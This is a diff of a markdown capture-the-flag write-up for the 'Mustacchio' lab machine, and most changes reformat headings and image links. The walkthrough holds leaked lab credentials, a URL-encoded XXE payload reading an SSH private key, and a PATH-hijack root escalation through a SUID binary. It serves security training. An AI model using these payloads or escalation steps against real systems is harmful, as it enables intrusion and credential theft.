@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f9d4-200d-2642-fe0f
 ---
+# ENUMERATION
+---
 
-# MUSTACCHIO
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | ssh     |
 | 80   | http    |
 | 8765 | http    |
@@ -43,29 +41,32 @@ PORT     STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## RECONNAISSANCE
 
-***
+# RECONNAISSANCE
+---
 
 Let's begin by visiting the `port 80` website:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317181844.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317181844.png)
 
 Let's do a simple fuzzing:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317181923.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317181923.png)
 
 We can see a `custom` directory, let's take a look:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317181943.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317181943.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317181952.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317181952.png)
 
 Got an `users.bak` file, we can browse this file using `sqlitebrowser`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317182139.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317182342.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317182139.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317182342.png)
 
 ```
 admin:bulldog19
@@ -73,11 +74,11 @@ admin:bulldog19
 
 Got credentials for admin, let's take a look at the other port since this contains a login page:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317182405.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317182405.png)
 
 Now we are inside the admin panel, we got a site in which we can add comments to the website, if we check source code, we find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317182739.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317182739.png)
 
 We got two important things, first, a path to a cookie, and an username:
 
@@ -88,19 +89,22 @@ barry
 
 If we go to the cookie route, we can download the file, let's analyze it with `sqlitebrowser` too:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317183024.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317183024.png)
 
 Not some interesting info aside from noticing that this goes in the `xml` format, let's begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 Let's send a simple request and check the format of it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317183500.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317183500.png)
 
 My guess is that since this reads from a `xml` file, it could be vulnerable to XXE, also, we can try crafting a payload to read `/etc/passwd`, we can use this python script to convert the payload into url encoding:
+
 
 ```python
 import urllib.parse
@@ -112,19 +116,23 @@ print(urllib.parse.quote(payload))
 
 Now, let's use it and copy the payload:
 
+
 ```python
 python3 convert.py
 
 %3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A///home/barry/.ssh/id_rsa%22%3E%20%5D%3E%0A%3Ccomment%3E%3Cname%3E%26xxe%3B%3C/name%3E%3Cauthor%3Etest%3C/author%3E%3Ccomment%3Etest%3C/comment%3E%3C/comment%3E
 ```
 
+
+
 If we use the payload:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317183744.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317183744.png)
 
 And there we go, we got LFI through exploiting this vulnerable parameter, we already know about `barry` and that we can login using his key, let's read the key:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317183859.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317183859.png)
 
 Let's grab the key and login as barry:
 
@@ -195,13 +203,15 @@ urieljames
 
 We can now log into ssh with it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317184506.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317184506.png)
 
 Let's start privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
 
 Let's find SUID binaries with root permissions:
 
@@ -233,15 +243,17 @@ barry@mustacchio:~$ find / -perm -4000 2>/dev/null
 /bin/su
 ```
 
+
 Found something interesting, we got `/home/joe/live_log`, if we use strings to analyze it. we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317185702.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317185702.png)
 
-This binary runs `tail -f /var/log/nginx/access.log` using a **relative path** (`tail` instead of `/usr/bin/tail`).
+This binary runs `tail -f /var/log/nginx/access.log` using a **relative path** (`tail` instead of `/usr/bin/tail`).
 
-We can hijack the `tail` command by creating a malicious script named `tail` in a directory we control and prepend that directory to the `PATH`.
+We can hijack the `tail` command by creating a malicious script named `tail` in a directory we control and prepend that directory to the `PATH`.
 
 Since this is owned by root, we can escalate our privileges into root by doing this:
+
 
 ```
 echo '/bin/bash -p' > /tmp/tail
@@ -252,9 +264,10 @@ export PATH=/tmp:$PATH
 
 We get this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317185813.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317185813.png)
 
 And we got root access, let's read both flags:
+
 
 ```
 root@mustacchio:~# cat /home/barry/user.txt
@@ -266,4 +279,5 @@ root@mustacchio:~# cat /root/root.txt
 3223581420d906c4dd1a5f9b530393a5
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250317185906.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317185906.png)
+
